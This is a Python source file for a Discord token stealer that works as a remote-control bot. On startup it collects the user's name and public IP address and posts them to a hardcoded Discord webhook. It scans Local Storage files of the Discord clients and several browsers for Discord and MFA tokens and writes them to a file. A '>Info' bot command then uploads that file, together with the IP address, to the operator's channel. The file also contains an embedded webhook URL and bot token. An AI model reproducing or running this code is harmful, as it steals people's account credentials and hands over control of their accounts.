from requests import *
import getpass
import random
import discord
from discord.ext import commands
from discord import File
from discordwebhook import Discord as DS

global GlobalTokens
GlobalTokens = ''

IPv4 = get('https://api.ipify.org').text
USER_NAME = getpass.getuser()



discordWeb = DS(url="https://discordapp.com/api/webhooks/744971336106901745/Pu8bYUTRreA_xj5hspxJgN6G9dpZfnhFcPQVrGT6ijsxTDiucx-l8zzc_4-8mre-QKmx")
discordWeb.post(
    content=f"Hey I just joined! {USER_NAME}",
    username=f"{USER_NAME}",
    avatar_url="https://avatars2.githubusercontent.com/u/38859131?s=460&amp;v=4"
)





def Token():
    import os
    import re




    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
                        StrToken = str(tokens)
                        TKFine = open('TK.txt', 'a+')
                        TKFine.write(StrToken)
                        TKFine.close()

        return tokens


    def main():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message =  ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = find_tokens(path)



    if __name__ == '__main__':
        main()



bot = commands.Bot(command_prefix='>')



print("Started")
@bot.command()
async def Info(ctx):
    Token()
    embed=discord.Embed(title="User Details", description=f"Details for {USER_NAME}")
    embed.set_author(name=USER_NAME)
    embed.add_field(name="Tokens", value=f"fi", inline=False)
    embed.add_field(name="IP", value=f"{IPv4}", inline=True)
    await ctx.send(embed=embed, file=File('TK.txt'))
    Delete = open('TK.txt', 'w')
    Delete.write("")
    Delete.close()





bot.run('NzQ2MDg1NDI4NDMxNDIxNDgy.Xz7MMw.nxG_3s7eG9KbxiyJn4lwL4s26WA')